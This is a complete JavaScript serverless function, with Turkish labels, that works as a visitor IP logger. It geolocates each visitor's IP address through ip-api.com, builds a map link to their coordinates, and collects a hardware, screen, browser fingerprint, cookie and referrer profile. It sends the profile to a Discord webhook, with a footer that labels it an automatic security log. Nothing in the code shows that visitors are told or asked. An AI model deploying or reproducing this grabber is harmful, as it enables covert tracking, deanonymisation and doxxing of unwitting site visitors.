exports.handler = async (event, context) => {
  let data = {};
  try {
    if (event.body) {
      data = JSON.parse(event.body);
    }
  } catch (e) {}

  const clientIp = data.ip || event.headers['cf-connecting-ip'] || event.headers['x-forwarded-for'] || 'Bilinmiyor';

  // GeoIP Bilgileri
  let country = 'Bilinmiyor';
  let city = 'Bilinmiyor';
  let isp = 'Bilinmiyor';
  let timezone = 'Bilinmiyor';
  let coords = null;

  if (clientIp !== 'Bilinmiyor') {
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,city,isp,org,timezone,lat,lon,as`);
      const geoData = await geoRes.json();

      if (geoData.status === 'success') {
        country = geoData.country || 'Bilinmiyor';
        city = geoData.city || 'Bilinmiyor';
        isp = `${geoData.isp || geoData.org} (${geoData.as || ''})`;
        timezone = geoData.timezone || 'Bilinmiyor';
        coords = `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}`;
      }
    } catch (e) {}
  }

  const embed = {
    title: "⚡ ZİYARETÇİ LOG RAPORU",
    color: 5814783,
    fields: [
      {
        name: "🌐 Ağ & Konum",
        value: 
          `• **IP:** \`${clientIp}\`\n` +
          `• **Konum:** ${city} / ${country}\n` +
          `• **İSS:** ${isp}\n` +
          `• **Zaman Dilimi:** ${timezone}\n` +
          (coords ? `• **Harita:** [Konuma Git](${coords})` : `• **Harita:** Bilinmiyor`),
        inline: false
      },
      {
        name: "💻 Donanım & Sistem",
        value: 
          `• **GPU:** \`${data.gpu || 'Bilinmiyor'}\`\n` +
          `• **CPU / RAM:** ${data.hardware || 'Bilinmiyor'}\n` +
          `• **İşletim Sistemi:** ${data.platform || 'Bilinmiyor'}\n` +
          `• **Batarya:** ${data.battery || 'Bilinmiyor'}\n` +
          `• **Cihazlar:** ${data.media || 'Bilinmiyor'}`,
        inline: false
      },
      {
        name: "🖥️ Ekran & Görüntü",
        value: 
          `• **Çözünürlük:** ${data.screen || 'Bilinmiyor'}\n` +
          `• **Pencere:** ${data.windowSize || 'Bilinmiyor'}\n` +
          `• **Renk Derinliği:** ${data.colorDepth || 'Bilinmiyor'}\n` +
          `• **Dokunmatik:** ${data.touch || 'Bilinmiyor'}`,
        inline: true
      },
      {
        name: "🔍 Oturum & Tarayıcı",
        value: 
          `• **Hash:** \`${data.fingerprint || 'Bilinmiyor'}\`\n` +
          `• **Diller:** ${data.languages || 'Bilinmiyor'}\n` +
          `• **Geldiği Yer:** ${data.referrer || 'Doğrudan'}\n` +
          `• **Çerezler:** ${data.cookies || 'Bilinmiyor'}`,
        inline: true
      },
      {
        name: "📌 Sayfa & User-Agent",
        value: 
          `• **URL:** ${data.url || 'Bilinmiyor'}\n` +
          `• **UA:** \`${event.headers['user-agent'] || 'Bilinmiyor'}\``,
        inline: false
      }
    ],
    footer: {
      text: "cloxinunbeaten.xyz • Otomatik Güvenlik Logu"
    },
    timestamp: new Date().toISOString()
  };

  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

  if (webhookUrl) {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  }

  return {
    statusCode: 200,
    body: JSON.stringify({ status: "ok" })
  };
};